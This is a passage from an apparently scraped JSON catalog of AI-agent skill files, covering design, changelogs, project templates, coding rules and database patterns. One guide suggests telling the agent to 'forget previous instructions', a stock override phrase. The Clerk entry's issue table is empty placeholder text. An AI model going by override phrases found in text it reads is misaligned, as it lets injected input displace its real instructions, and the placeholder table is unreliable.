gesture - never paragraphs, only essential words integrated into the visual architecture. Every element placed with the precision of a master craftsman.\n\n**\"Chromatic Language\"**\nPhilosophy: Color as the primary information system.\nVisual expression: Geometric precision where color zones create meaning. Typography minimal - small sans-serif labels letting chromatic fields communicate. Think Josef Albers' interaction meets data visualization. Information encoded spatially and chromatically. Words only to anchor what color already shows. The result of painstaking chromatic calibration.\n\n**\"Analog Meditation\"**\nPhilosophy: Quiet visual contemplation through texture and breathing room.\nVisual expression: Paper grain, ink bleeds, vast negative space. Photography and illustration dominate. Typography whispered (small, restrained, serving the visual). Japanese photobook aesthetic. Images breathe across pages. Text appears sparingly - short phrases, never explanatory blocks. Each composition balanced with the care of a meditation practice.\n\n**\"Organic Systems\"**\nPhilosophy: Natural clustering and modular growth patterns.\nVisual expression: Rounded forms, organic arrangements, color from nature through architecture. Information shown through visual diagrams, spatial relationships, iconography. Text only for key labels floating in space. The composition tells the story through expert spatial orchestration.\n\n**\"Geometric Silence\"**\nPhilosophy: Pure order and restraint.\nVisual expression: Grid-based precision, bold photography or stark graphics, dramatic negative space. Typography precise but minimal - small essential text, large quiet zones. Swiss formalism meets Brutalist material honesty. Structure communicates, not words. Every alignment the work of countless refinements.\n\n*These are condensed examples. The actual design philosophy should be 4-6 substantial paragraphs.*\n\n### ESSENTIAL PRINCIPLES\n- **VISUAL PHILOSOPHY**: Create an aesthetic worldview to be expressed through design\n- **MINIMAL TEXT**: Always emphasize that text is sparse, esse",
      "tags": [
        "pdf",
        "claude",
        "ai",
        "template",
        "design",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:31.480Z"
    },
    {
      "id": "awesome-llm-canvas-design",
      "name": "canvas-design",
      "slug": "awesome-llm-canvas-design",
      "description": "Create beautiful visual art in .png and .pdf documents using design philosophy. You should use this skill when the user asks to create a poster, piece of art, design, or other static piece. Create original visual designs, never copying existing artists' work to avoid copyright violations.",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/canvas-design",
      "content": "\nThese are instructions for creating design philosophies - aesthetic movements that are then EXPRESSED VISUALLY. Output only .md files, .pdf files, and .png files.\n\nComplete this in two steps:\n1. Design Philosophy Creation (.md file)\n2. Express by creating it on a canvas (.pdf file or .png file)\n\nFirst, undertake this task:\n\n## DESIGN PHILOSOPHY CREATION\n\nTo begin, create a VISUAL PHILOSOPHY (not layouts or templates) that will be interpreted through:\n- Form, space, color, composition\n- Images, graphics, shapes, patterns\n- Minimal text as visual accent\n\n### THE CRITICAL UNDERSTANDING\n- What is received: Some subtle input or instructions by the user that should be taken into account, but used as a foundation; it should not constrain creative freedom.\n- What is created: A design philosophy/aesthetic movement.\n- What happens next: Then, the same version receives the philosophy and EXPRESSES IT VISUALLY - creating artifacts that are 90% visual design, 10% essential text.\n\nConsider this approach:\n- Write a manifesto for an art movement\n- The next phase involves making the artwork\n\nThe philosophy must emphasize: Visual expression. Spatial communication. Artistic interpretation. Minimal words.\n\n### HOW TO GENERATE A VISUAL PHILOSOPHY\n\n**Name the movement** (1-2 words): \"Brutalist Joy\" / \"Chromatic Silence\" / \"Metabolist Dreams\"\n\n**Articulate the philosophy** (4-6 paragraphs - concise but complete):\n\nTo capture the VISUAL essence, express how the philosophy manifests through:\n- Space and form\n- Color and material\n- Scale and rhythm\n- Composition and balance\n- Visual hierarchy\n\n**CRITICAL GUIDELINES:**\n- **Avoid redundancy**: Each design aspect should be mentioned once. Avoid repeating points about color theory, spatial relationships, or typographic principles unless adding new depth.\n- **Emphasize craftsmanship REPEATEDLY**: The philosophy MUST stress multiple times that the final work should appear as though it took countless hours to create, was labored over with care, and comes from someone at the absolute top of their field. This framing is essential - repeat phrases like \"meticulously crafted,\" \"the product of deep expertise,\" \"painstaking attention,\" \"master-level execution.\"\n- **Leave creative space**: Remain specific about the aesthetic direction, but concise enough that the next Claude has room to make interpretive choices also at a extremely high level of craftmanship.\n\nThe philosophy must guide the next version to express ideas VISUALLY, not through text. Information lives in design, not paragraphs.\n\n### PHILOSOPHY EXAMPLES\n\n**\"Concrete Poetry\"**\nPhilosophy: Communication through monumental form and bold geometry.\nVisual expression: Massive color blocks, sculptural typography (huge single words, tiny labels), Brutalist spatial divisions, Polish poster energy meets Le Corbusier. Ideas expressed through visual weight and spatial tension, not explanation. Text as rare, powerful gesture - never paragraphs, only essential words integrated into the visual architecture. Every element placed with the precision of a master craftsman.\n\n**\"Chromatic Language\"**\nPhilosophy: Color as the primary information system.\nVisual expression: Geometric precision where color zones create meaning. Typography minimal - small sans-serif labels letting chromatic fields communicate. Think Josef Albers' interaction meets data visualization. Information encoded spatially and chromatically. Words only to anchor what color already shows. The result of painstaking chromatic calibration.\n\n**\"Analog Meditation\"**\nPhilosophy: Quiet visual contemplation through texture and breathing room.\nVisual expression: Paper grain, ink bleeds, vast negative space. Photography and illustration dominate. Typography whispered (small, restrained, serving the visual). Japanese photobook aesthetic. Images breathe across pages. Text appears sparingly - short phrases, never explanatory blocks. Each composition balanced with the care of a meditation practice.\n\n**\"Organic Systems\"**\nPhilosophy: Natural clustering and modular growth patterns.\nVisual expression: Rounded forms, organic arrangements, color from nature through architecture. Information shown through visual diagrams, spatial relationships, iconography. Text only for key labels floating in space. The composition tells the story through expert spatial orchestration.\n\n**\"Geometric Silence\"**\nPhilosophy: Pure order and restraint.\nVisual expression: Grid-based precision, bold photography or stark graphics, dramatic negative space. Typography precise but minimal - small essential text, large quiet zones. Swiss formalism meets Brutalist material honesty. Structure communicates, not words. Every alignment the work of countless refinements.\n\n*These are condensed examples. The actual design philosophy should be 4-6 substantial paragraphs.*\n\n### ESSENTIAL PRINCIPLES\n- **VISUAL PHILOSOPHY**: Create an aesthetic worldview to be expressed through design\n- **MINIMAL TEXT**: Always emphasize that text is sparse, esse",
      "tags": [
        "pdf",
        "claude",
        "ai",
        "template",
        "design",
        "image",
        "canvas"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:41.579Z"
    },
    {
      "id": "antigravity-cc-skill-continuous-learning",
      "name": "cc-skill-continuous-learning",
      "slug": "cc-skill-continuous-learning",
      "description": "Development skill from everything-claude-code",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-continuous-learning",
      "content": "\n# cc-skill-continuous-learning\n\nDevelopment skill skill.\n",
      "tags": [
        "claude"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:23.030Z"
    },
    {
      "id": "antigravity-cc-skill-project-guidelines-example",
      "name": "cc-skill-project-guidelines-example",
      "slug": "cc-skill-project-guidelines-example",
      "description": "Project Guidelines Skill (Example)",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-project-guidelines-example",
      "content": "\n# Project Guidelines Skill (Example)\n\nThis is an example of a project-specific skill. Use this as a template for your own projects.\n\nBased on a real production application: [Zenith](https://zenith.chat) - AI-powered customer discovery platform.\n\n---\n\n## When to Use\n\nReference this skill when working on the specific project it's designed for. Project skills contain:\n- Architecture overview\n- File structure\n- Code patterns\n- Testing requirements\n- Deployment workflow\n\n---\n\n## Architecture Overview\n\n**Tech Stack:**\n- **Frontend**: Next.js 15 (App Router), TypeScript, React\n- **Backend**: FastAPI (Python), Pydantic models\n- **Database**: Supabase (PostgreSQL)\n- **AI**: Claude API with tool calling and structured output\n- **Deployment**: Google Cloud Run\n- **Testing**: Playwright (E2E), pytest (backend), React Testing Library\n\n**Services:**\n```\n┌─────────────────────────────────────────────────────────────┐\n│                         Frontend                            │\n│  Next.js 15 + TypeScript + TailwindCSS                     │\n│  Deployed: Vercel / Cloud Run                              │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n┌─────────────────────────────────────────────────────────────┐\n│                         Backend                             │\n│  FastAPI + Python 3.11 + Pydantic                          │\n│  Deployed: Cloud Run                                       │\n└─────────────────────────────────────────────────────────────┘\n                              │\n              ┌───────────────┼───────────────┐\n              ▼               ▼               ▼\n        ┌──────────┐   ┌──────────┐   ┌──────────┐\n        │ Supabase │   │  Claude  │   │  Redis   │\n        │ Database │   │   API    │   │  Cache   │\n        └──────────┘   └──────────┘   └──────────┘\n```\n\n---\n\n## File Structure\n\n```\nproject/\n├── frontend/\n│   └── src/\n│       ├── app/              # Next.js app router pages\n│       │   ├── api/          # API routes\n│       │   ├── (auth)/       # Auth-protected routes\n│       │   └── workspace/    # Main app workspace\n│       ├── components/       # React components\n│       │   ├── ui/           # Base UI components\n│       │   ├── forms/        # Form components\n│       │   └── layouts/      # Layout components\n│       ├── hooks/            # Custom React hooks\n│       ├── lib/              # Utilities\n│       ├── types/            # TypeScript definitions\n│       └── config/           # Configuration\n│\n├── backend/\n│   ├── routers/              # FastAPI route handlers\n│   ├── models.py             # Pydantic models\n│   ├── main.py               # FastAPI app entry\n│   ├── auth_system.py        # Authentication\n│   ├── database.py           # Database operations\n│   ├── services/             # Business logic\n│   └── tests/                # pytest tests\n│\n├── deploy/                   # Deployment configs\n├── docs/                     # Documentation\n└── scripts/                  # Utility scripts\n```\n\n---\n\n## Code Patterns\n\n### API Response Format (FastAPI)\n\n```python\nfrom pydantic import BaseModel\nfrom typing import Generic, TypeVar, Optional\n\nT = TypeVar('T')\n\nclass ApiResponse(BaseModel, Generic[T]):\n    success: bool\n    data: Optional[T] = None\n    error: Optional[str] = None\n\n    @classmethod\n    def ok(cls, data: T) -> \"ApiResponse[T]\":\n        return cls(success=True, data=data)\n\n    @classmethod\n    def fail(cls, error: str) -> \"ApiResponse[T]\":\n        return cls(success=False, error=error)\n```\n\n### Frontend API Calls (TypeScript)\n\n```typescript\ninterface ApiResponse<T> {\n  success: boolean\n  data?: T\n  error?: string\n}\n\nasync function fetchApi<T>(\n  endpoint: string,\n  options?: RequestInit\n): Promise<ApiResponse<T>> {\n  try {\n    const response = await fetch(`/api${endpoint}`, {\n      ...options,\n      headers: {\n        'Content-Type': 'application/json',\n        ...options?.headers,\n      },\n    })\n\n    if (!response.ok) {\n      return { success: false, error: `HTTP ${response.status}` }\n    }\n\n    return await response.json()\n  } catch (error) {\n    return { success: false, error: String(error) }\n  }\n}\n```\n\n### Claude AI Integration (Structured Output)\n\n```python\nfrom anthropic import Anthropic\nfrom pydantic import BaseModel\n\nclass AnalysisResult(BaseModel):\n    summary: str\n    key_points: list[str]\n    confidence: float\n\nasync def analyze_with_claude(content: str) -> AnalysisResult:\n    client = Anthropic()\n\n    response = client.messages.create(\n        model=\"claude-sonnet-4-5-20250514\",\n        max_tokens=1024,\n        messages=[{\"role\": \"user\", \"content\": content}],\n        tools=[{\n            \"name\": \"provide_analysis\",\n            \"description\": \"Provide structured analysis\",\n            \"input_schema\": AnalysisResult.model_json_schema()\n        }],\n        tool_choice={\"type\": \"tool\", \"name\": \"provide_analysis\"}\n    )\n\n    # Extract tool use result\n    tool_use = next(\n        ",
      "tags": [
        "python",
        "typescript",
        "react",
        "api",
        "claude",
        "ai",
        "workflow",
        "template",
        "design",
        "document"
      ],
      "useCases": [
        "Architecture overview",
        "File structure",
        "Code patterns",
        "Testing requirements",
        "Deployment workflow"
      ],
      "scrapedAt": "2026-01-26T13:17:25.597Z"
    },
    {
      "id": "antigravity-cc-skill-strategic-compact",
      "name": "cc-skill-strategic-compact",
      "slug": "cc-skill-strategic-compact",
      "description": "Development skill from everything-claude-code",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-strategic-compact",
      "content": "\n# cc-skill-strategic-compact\n\nDevelopment skill skill.\n",
      "tags": [
        "claude"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:28.108Z"
    },
    {
      "id": "composio-changelog-generator",
      "name": "changelog-generator",
      "slug": "changelog-generator",
      "description": "Automatically creates user-facing changelogs from git commits by analyzing commit history, categorizing changes, and transforming technical commits into clear, customer-friendly release notes. Turns hours of manual changelog writing into minutes of automated generation.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/changelog-generator",
      "content": "\n# Changelog Generator\n\nThis skill transforms technical git commits into polished, user-friendly changelogs that your customers and users will actually understand and appreciate.\n\n## When to Use This Skill\n\n- Preparing release notes for a new version\n- Creating weekly or monthly product update summaries\n- Documenting changes for customers\n- Writing changelog entries for app store submissions\n- Generating update notifications\n- Creating internal release documentation\n- Maintaining a public changelog/product updates page\n\n## What This Skill Does\n\n1. **Scans Git History**: Analyzes commits from a specific time period or between versions\n2. **Categorizes Changes**: Groups commits into logical categories (features, improvements, bug fixes, breaking changes, security)\n3. **Translates Technical → User-Friendly**: Converts developer commits into customer language\n4. **Formats Professionally**: Creates clean, structured changelog entries\n5. **Filters Noise**: Excludes internal commits (refactoring, tests, etc.)\n6. **Follows Best Practices**: Applies changelog guidelines and your brand voice\n\n## How to Use\n\n### Basic Usage\n\nFrom your project repository:\n\n```\nCreate a changelog from commits since last release\n```\n\n```\nGenerate changelog for all commits from the past week\n```\n\n```\nCreate release notes for version 2.5.0\n```\n\n### With Specific Date Range\n\n```\nCreate a changelog for all commits between March 1 and March 15\n```\n\n### With Custom Guidelines\n\n```\nCreate a changelog for commits since v2.4.0, using my changelog \nguidelines from CHANGELOG_STYLE.md\n```\n\n## Example\n\n**User**: \"Create a changelog for commits from the past 7 days\"\n\n**Output**:\n```markdown\n# Updates - Week of March 10, 2024\n\n## ✨ New Features\n\n- **Team Workspaces**: Create separate workspaces for different \n  projects. Invite team members and keep everything organized.\n\n- **Keyboard Shortcuts**: Press ? to see all available shortcuts. \n  Navigate faster without touching your mouse.\n\n## 🔧 Improvements\n\n- **Faster Sync**: Files now sync 2x faster across devices\n- **Better Search**: Search now includes file contents, not just titles\n\n## 🐛 Fixes\n\n- Fixed issue where large images wouldn't upload\n- Resolved timezone confusion in scheduled posts\n- Corrected notification badge count\n```\n\n**Inspired by:** Manik Aggarwal's use case from Lenny's Newsletter\n\n## Tips\n\n- Run from your git repository root\n- Specify date ranges for focused changelogs\n- Use your CHANGELOG_STYLE.md for consistent formatting\n- Review and adjust the generated changelog before publishing\n- Save output directly to CHANGELOG.md\n\n## Related Use Cases\n\n- Creating GitHub release notes\n- Writing app store update descriptions\n- Generating email updates for users\n- Creating social media announcement posts\n\n",
      "tags": [
        "git",
        "github",
        "markdown",
        "ai"
      ],
      "useCases": [
        "Preparing release notes for a new version",
        "Creating weekly or monthly product update summaries",
        "Documenting changes for customers",
        "Writing changelog entries for app store submissions",
        "Generating update notifications"
      ],
      "scrapedAt": "2026-01-26T13:14:54.145Z"
    },
    {
      "id": "awesome-llm-changelog-generator",
      "name": "changelog-generator",
      "slug": "awesome-llm-changelog-generator",
      "description": "Automatically creates user-facing changelogs from git commits by analyzing commit history, categorizing changes, and transforming technical commits into clear, customer-friendly release notes. Turns hours of manual changelog writing into minutes of automated generation.",
      "category": "Development & Code Tools",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/changelog-generator",
      "content": "\n# Changelog Generator\n\nThis skill transforms technical git commits into polished, user-friendly changelogs that your customers and users will actually understand and appreciate.\n\n## When to Use This Skill\n\n- Preparing release notes for a new version\n- Creating weekly or monthly product update summaries\n- Documenting changes for customers\n- Writing changelog entries for app store submissions\n- Generating update notifications\n- Creating internal release documentation\n- Maintaining a public changelog/product updates page\n\n## What This Skill Does\n\n1. **Scans Git History**: Analyzes commits from a specific time period or between versions\n2. **Categorizes Changes**: Groups commits into logical categories (features, improvements, bug fixes, breaking changes, security)\n3. **Translates Technical → User-Friendly**: Converts developer commits into customer language\n4. **Formats Professionally**: Creates clean, structured changelog entries\n5. **Filters Noise**: Excludes internal commits (refactoring, tests, etc.)\n6. **Follows Best Practices**: Applies changelog guidelines and your brand voice\n\n## How to Use\n\n### Basic Usage\n\nFrom your project repository:\n\n```\nCreate a changelog from commits since last release\n```\n\n```\nGenerate changelog for all commits from the past week\n```\n\n```\nCreate release notes for version 2.5.0\n```\n\n### With Specific Date Range\n\n```\nCreate a changelog for all commits between March 1 and March 15\n```\n\n### With Custom Guidelines\n\n```\nCreate a changelog for commits since v2.4.0, using my changelog \nguidelines from CHANGELOG_STYLE.md\n```\n\n## Example\n\n**User**: \"Create a changelog for commits from the past 7 days\"\n\n**Output**:\n```markdown\n# Updates - Week of March 10, 2024\n\n## ✨ New Features\n\n- **Team Workspaces**: Create separate workspaces for different \n  projects. Invite team members and keep everything organized.\n\n- **Keyboard Shortcuts**: Press ? to see all available shortcuts. \n  Navigate faster without touching your mouse.\n\n## 🔧 Improvements\n\n- **Faster Sync**: Files now sync 2x faster across devices\n- **Better Search**: Search now includes file contents, not just titles\n\n## 🐛 Fixes\n\n- Fixed issue where large images wouldn't upload\n- Resolved timezone confusion in scheduled posts\n- Corrected notification badge count\n```\n\n**Inspired by:** Manik Aggarwal's use case from Lenny's Newsletter\n\n## Tips\n\n- Run from your git repository root\n- Specify date ranges for focused changelogs\n- Use your CHANGELOG_STYLE.md for consistent formatting\n- Review and adjust the generated changelog before publishing\n- Save output directly to CHANGELOG.md\n\n## Related Use Cases\n\n- Creating GitHub release notes\n- Writing app store update descriptions\n- Generating email updates for users\n- Creating social media announcement posts\n\n",
      "tags": [
        "markdown",
        "ai",
        "image",
        "changelog",
        "generator"
      ],
      "useCases": [
        "Preparing release notes for a new version",
        "Creating weekly or monthly product update summaries",
        "Documenting changes for customers",
        "Writing changelog entries for app store submissions",
        "Generating update notifications"
      ],
      "scrapedAt": "2026-01-26T13:15:42.816Z"
    },
    {
      "id": "antigravity-claude-code-guide",
      "name": "Claude Code Guide",
      "slug": "claude-code-guide",
      "description": "Master guide for using Claude Code effectively. Includes configuration templates, prompting strategies \"Thinking\" keywords, debugging techniques, and best practices for interacting with the agent.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/claude-code-guide",
      "content": "\n# Claude Code Guide\n\n## Purpose\n\nTo provide a comprehensive reference for configuring and using Claude Code (the agentic coding tool) to its full potential. This skill synthesizes best practices, configuration templates, and advanced usage patterns.\n\n## Configuration (`CLAUDE.md`)\n\nWhen starting a new project, create a `CLAUDE.md` file in the root directory to guide the agent.\n\n### Template (General)\n\n```markdown\n# Project Guidelines\n\n## Commands\n\n- Run app: `npm run dev`\n- Test: `npm test`\n- Build: `npm run build`\n\n## Code Style\n\n- Use TypeScript for all new code.\n- Functional components with Hooks for React.\n- Tailwind CSS for styling.\n- Early returns for error handling.\n\n## Workflow\n\n- Read `README.md` first to understand project context.\n- Before editing, read the file content.\n- After editing, run tests to verify.\n```\n\n## Advanced Features\n\n### Thinking Keywords\n\nUse these keywords in your prompts to trigger deeper reasoning from the agent:\n\n- \"Think step-by-step\"\n- \"Analyze the root cause\"\n- \"Plan before executing\"\n- \"Verify your assumptions\"\n\n### Debugging\n\nIf the agent is stuck or behaving unexpectedly:\n\n1. **Clear Context**: Start a new session or ask the agent to \"forget previous instructions\" if confused.\n2. **Explicit Instructions**: Be extremely specific about paths, filenames, and desired outcomes.\n3. **Logs**: Ask the agent to \"check the logs\" or \"run the command with verbose output\".\n\n## Best Practices\n\n1. **Small Contexts**: Don't dump the entire codebase into the context. Use `grep` or `find` to locate relevant files first.\n2. **Iterative Development**: Ask for small changes, verify, then proceed.\n3. **Feedback Loop**: If the agent makes a mistake, correct it immediately and ask it to \"add a lesson\" to its memory (if supported) or `CLAUDE.md`.\n\n## Reference\n\nBased on [Claude Code Guide by zebbern](https://github.com/zebbern/claude-code-guide).\n",
      "tags": [
        "typescript",
        "react",
        "markdown",
        "claude",
        "ai",
        "agent",
        "workflow",
        "template",
        "tailwind"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:29.453Z"
    },
    {
      "id": "antigravity-clean-code",
      "name": "clean-code",
      "slug": "clean-code",
      "description": "Pragmatic coding standards - concise, direct, no over-engineering, no unnecessary comments",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/clean-code",
      "content": "\n# Clean Code - Pragmatic AI Coding Standards\n\n> **CRITICAL SKILL** - Be **concise, direct, and solution-focused**.\n\n---\n\n## Core Principles\n\n| Principle | Rule |\n|-----------|------|\n| **SRP** | Single Responsibility - each function/class does ONE thing |\n| **DRY** | Don't Repeat Yourself - extract duplicates, reuse |\n| **KISS** | Keep It Simple - simplest solution that works |\n| **YAGNI** | You Aren't Gonna Need It - don't build unused features |\n| **Boy Scout** | Leave code cleaner than you found it |\n\n---\n\n## Naming Rules\n\n| Element | Convention |\n|---------|------------|\n| **Variables** | Reveal intent: `userCount` not `n` |\n| **Functions** | Verb + noun: `getUserById()` not `user()` |\n| **Booleans** | Question form: `isActive`, `hasPermission`, `canEdit` |\n| **Constants** | SCREAMING_SNAKE: `MAX_RETRY_COUNT` |\n\n> **Rule:** If you need a comment to explain a name, rename it.\n\n---\n\n## Function Rules\n\n| Rule | Description |\n|------|-------------|\n| **Small** | Max 20 lines, ideally 5-10 |\n| **One Thing** | Does one thing, does it well |\n| **One Level** | One level of abstraction per function |\n| **Few Args** | Max 3 arguments, prefer 0-2 |\n| **No Side Effects** | Don't mutate inputs unexpectedly |\n\n---\n\n## Code Structure\n\n| Pattern | Apply |\n|---------|-------|\n| **Guard Clauses** | Early returns for edge cases |\n| **Flat > Nested** | Avoid deep nesting (max 2 levels) |\n| **Composition** | Small functions composed together |\n| **Colocation** | Keep related code close |\n\n---\n\n## AI Coding Style\n\n| Situation | Action |\n|-----------|--------|\n| User asks for feature | Write it directly |\n| User reports bug | Fix it, don't explain |\n| No clear requirement | Ask, don't assume |\n\n---\n\n## Anti-Patterns (DON'T)\n\n| ❌ Pattern | ✅ Fix |\n|-----------|-------|\n| Comment every line | Delete obvious comments |\n| Helper for one-liner | Inline the code |\n| Factory for 2 objects | Direct instantiation |\n| utils.ts with 1 function | Put code where used |\n| \"First we import...\" | Just write code |\n| Deep nesting | Guard clauses |\n| Magic numbers | Named constants |\n| God functions | Split by responsibility |\n\n---\n\n## 🔴 Before Editing ANY File (THINK FIRST!)\n\n**Before changing a file, ask yourself:**\n\n| Question | Why |\n|----------|-----|\n| **What imports this file?** | They might break |\n| **What does this file import?** | Interface changes |\n| **What tests cover this?** | Tests might fail |\n| **Is this a shared component?** | Multiple places affected |\n\n**Quick Check:**\n```\nFile to edit: UserService.ts\n└── Who imports this? → UserController.ts, AuthController.ts\n└── Do they need changes too? → Check function signatures\n```\n\n> 🔴 **Rule:** Edit the file + all dependent files in the SAME task.\n> 🔴 **Never leave broken imports or missing updates.**\n\n---\n\n## Summary\n\n| Do | Don't |\n|----|-------|\n| Write code directly | Write tutorials |\n| Let code self-document | Add obvious comments |\n| Fix bugs immediately | Explain the fix first |\n| Inline small things | Create unnecessary files |\n| Name things clearly | Use abbreviations |\n| Keep functions small | Write 100+ line functions |\n\n> **Remember: The user wants working code, not a programming lesson.**\n\n---\n\n## 🔴 Self-Check Before Completing (MANDATORY)\n\n**Before saying \"task complete\", verify:**\n\n| Check | Question |\n|-------|----------|\n| ✅ **Goal met?** | Did I do exactly what user asked? |\n| ✅ **Files edited?** | Did I modify all necessary files? |\n| ✅ **Code works?** | Did I test/verify the change? |\n| ✅ **No errors?** | Lint and TypeScript pass? |\n| ✅ **Nothing forgotten?** | Any edge cases missed? |\n\n> 🔴 **Rule:** If ANY check fails, fix it before completing.\n\n---\n\n## Verification Scripts (MANDATORY)\n\n> 🔴 **CRITICAL:** Each agent runs ONLY their own skill's scripts after completing work.\n\n### Agent → Script Mapping\n\n| Agent | Script | Command |\n|-------|--------|---------|\n| **frontend-specialist** | UX Audit | `python ~/.claude/skills/frontend-design/scripts/ux_audit.py .` |\n| **frontend-specialist** | A11y Check | `python ~/.claude/skills/frontend-design/scripts/accessibility_checker.py .` |\n| **backend-specialist** | API Validator | `python ~/.claude/skills/api-patterns/scripts/api_validator.py .` |\n| **mobile-developer** | Mobile Audit | `python ~/.claude/skills/mobile-design/scripts/mobile_audit.py .` |\n| **database-architect** | Schema Validate | `python ~/.claude/skills/database-design/scripts/schema_validator.py .` |\n| **security-auditor** | Security Scan | `python ~/.claude/skills/vulnerability-scanner/scripts/security_scan.py .` |\n| **seo-specialist** | SEO Check | `python ~/.claude/skills/seo-fundamentals/scripts/seo_checker.py .` |\n| **seo-specialist** | GEO Check | `python ~/.claude/skills/geo-fundamentals/scripts/geo_checker.py .` |\n| **performance-optimizer** | Lighthouse | `python ~/.claude/skills/performance-profiling/scripts/lighthouse_audit.py <url>` |\n| **test-engineer** | Test Runner | `python ~/.claude/skills/testing-patterns/scripts/test_runner",
      "tags": [
        "python",
        "typescript",
        "markdown",
        "api",
        "claude",
        "ai",
        "agent",
        "design",
        "document",
        "security"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:33.937Z"
    },
    {
      "id": "antigravity-clerk-auth",
      "name": "clerk-auth",
      "slug": "clerk-auth",
      "description": "Expert patterns for Clerk auth implementation, middleware, organizations, webhooks, and user sync Use when: adding authentication, clerk auth, user authentication, sign in, sign up.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/clerk-auth",
      "content": "\n# Clerk Authentication\n\n## Patterns\n\n### Next.js App Router Setup\n\nComplete Clerk setup for Next.js 14/15 App Router.\n\nIncludes ClerkProvider, environment variables, and basic\nsign-in/sign-up components.\n\nKey components:\n- ClerkProvider: Wraps app for auth context\n- <SignIn />, <SignUp />: Pre-built auth forms\n- <UserButton />: User menu with session management\n\n\n### Middleware Route Protection\n\nProtect routes using clerkMiddleware and createRouteMatcher.\n\nBest practices:\n- Single middleware.ts file at project root\n- Use createRouteMatcher for route groups\n- auth.protect() for explicit protection\n- Centralize all auth logic in middleware\n\n\n### Server Component Authentication\n\nAccess auth state in Server Components using auth() and currentUser().\n\nKey functions:\n- auth(): Returns userId, sessionId, orgId, claims\n- currentUser(): Returns full User object\n- Both require clerkMiddleware to be configured\n\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n",
      "tags": [
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:35.199Z"
    },
    {
      "id": "antigravity-cc-skill-clickhouse-io",
      "name": "clickhouse-io",
      "slug": "cc-skill-clickhouse-io",
      "description": "ClickHouse database patterns, query optimization, analytics, and data engineering best practices for high-performance analytical workloads.",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-clickhouse-io",
      "content": "\n# ClickHouse Analytics Patterns\n\nClickHouse-specific patterns for high-performance analytics and data engineering.\n\n## Overview\n\nClickHouse is a column-oriented database management system (DBMS) for online analytical processing (OLAP). It's optimized for fast analytical queries on large datasets.\n\n**Key Features:**\n- Column-oriented storage\n- Data compression\n- Parallel query execution\n- Distributed queries\n- Real-time analytics\n\n## Table Design Patterns\n\n### MergeTree Engine (Most Common)\n\n```sql\nCREATE TABLE markets_analytics (\n    date Date,\n    market_id String,\n    market_name String,\n    volume UInt64,\n    trades UInt32,\n    unique_traders UInt32,\n    avg_trade_size Float64,\n    created_at DateTime\n) ENGINE = MergeTree()\nPARTITION BY toYYYYMM(date)\nORDER BY (date, market_id)\nSETTINGS index_granularity = 8192;\n```\n\n### ReplacingMergeTree (Deduplication)\n\n```sql\n-- For data that may have duplicates (e.g., from multiple sources)\nCREATE TABLE user_events (\n    event_id String,\n    user_id String,\n    event_type String,\n    timestamp DateTime,\n    properties String\n) ENGINE = ReplacingMergeTree()\nPARTITION BY toYYYYMM(timestamp)\nORDER BY (user_id, event_id, timestamp)\nPRIMARY KEY (user_id, event_id);\n```\n\n### AggregatingMergeTree (Pre-aggregation)\n\n```sql\n-- For maintaining aggregated metrics\nCREATE TABLE market_stats_hourly (\n    hour DateTime,\n    market_id String,\n    total_volume AggregateFunction(sum, UInt64),\n    total_trades AggregateFunction(count, UInt32),\n    unique_users AggregateFunction(uniq, String)\n) ENGINE = AggregatingMergeTree()\nPARTITION BY toYYYYMM(hour)\nORDER BY (hour, market_id);\n\n-- Query aggregated data\nSELECT\n    hour,\n    market_id,\n    sumMerge(total_volume) AS volume,\n    countMerge(total_trades) AS trades,\n    uniqMerge(unique_users) AS users\nFROM market_stats_hourly\nWHERE hour >= toStartOfHour(now() - INTERVAL 24 HOUR)\nGROUP BY hour, market_id\nORDER BY hour DESC;\n```\n\n## Query Optimization Patterns\n\n### Efficient Filtering\n\n```sql\n-- ✅ GOOD: Use indexed columns first\nSELECT *\nFROM markets_analytics\nWHERE date >= 